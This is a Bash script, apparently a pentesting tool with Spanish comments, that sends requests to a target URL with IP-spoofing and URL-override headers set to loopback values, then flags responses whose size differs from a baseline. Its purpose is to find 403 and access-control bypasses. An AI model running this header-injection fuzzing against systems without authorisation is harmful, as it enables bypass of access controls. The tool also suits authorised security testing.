#!/bin/bash

# Color Definitions
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
MAGENTA="${C}[1;35m"
CYAN="${C}[1;36m"
LIGHT_GRAY="${C}[1;37m"
DARK_GRAY="${C}[1;90m"
NC="${C}[0m" # No Color
UNDERLINED="${C}[4m"
ITALIC="${C}[3m"
PARPADEO="${C}[1;5m"

# Report time mark
date=$(date +'%d_%m_%Y_%H%M%S')
report="report_$date.txt"
write_report() {
	local message=$1
        echo -e "$message" >> $report
}

#global variables

headers=("Client-IP" "Connection" "Contact" "Forwarded" "From" "Host" "Origin" "Referer" "True-Client-IP" "X-Client-IP" "X-Custom-IP-Authorization" "X-Forward-For" "X-Forwarded-For" "X-Forwarded-Host" "X-Forwarded-Server" "X-Host" "X-HTTP-Host-Override" "X-Original-URL" "X-Originating-IP" "X-Real-IP" "X-Remote-Addr" "X-Remote-IP" "X-Rewrite-URL" "X-Wap-Profile")
values=("127.0.0.1" "localhost" "0.0.0.0" "0" "127.1" "127.0.1" "2130706433" "0x7f.1")
url=""
timeout=""
payload=""


#function to get the length of the content of an http request
get_content_length() {
	local url="$1"
	local header="$2"
	local value="$3"

	#make the request to get the length
	if [ -z "$header" ]; then
		content_length=$(curl -s -o /dev/null -w '%{size_download}' "$url")
	else
		content_length=$(curl -s -o /dev/null -w '%{size_download}' -H "$header: $value" "$url")

	fi

	echo "$content_length"
}

#Function to make injections of headers
header_injection() {
	echo "[${GREEN}INFO${NC}] Making baseline request..."
	baseline_length=$(get_content_length "$url" "" "")

	write_report "[${GREEN}INFO${NC}]Base content length: $baseline_length"

	#iterate over all combinations of headers and injection values
	for header in "${headers[@]}"; do
		for value in "${values[@]}"; do
			#make the request with the header and value injected
			current_length=$(get_content_length "$url" "$header" "$value")

			#Comparation with baseline
			if [ "$baseline_length" != "$current_length" ]; then
				write_report "[${GREEN}+${NC}] ${GREEN}$url [$header: $value] [Size: $current_length]${NC}"
			else
				write_report "[${RED}-${NC}] $url [$header: $value] [Size: $current_length]"
			fi
		done
	done
}

#function to load custom injections from file
custom_injections() {
	if [ -f "$payload" ]; then
		values=()
		while IFS= read -r line; do
			values+=("$line")
		done < "$payload"
	else
		echo "[${RED}ERROR${NC}]Payload file not found: $payload"
		exit 1
	fi
}


function usage() {
    echo "Usage:"
    echo "  $0 -u https://target.com/resource [-p payload_file] [-t timeout]"
    echo "Options:"
    echo "  -u URL "
    echo "  -p File with payload values"
    echo "  -t Request timeout (in seconds)"
}

# Procesar argumentos de la línea de comandos
while getopts "u:p:t:h" opt; do
    case $opt in
        u) url="$OPTARG" ;;
        p) payload="$OPTARG" ;;
        t) timeout="$OPTARG" ;;
        h) usage; exit 0 ;;
        *) usage; exit 1 ;;
    esac
done

# Verificar que la URL haya sido proporcionada
if [ -z "$url" ]; then
    echo "Debe especificar una URL."
    usage
    exit 1
fi

# Si se proporciona un archivo de payload, cargar valores personalizados
if [ -n "$payload" ]; then
    custom_injections
fi

# Ejecutar el proceso de inyección de cabecera
header_injection
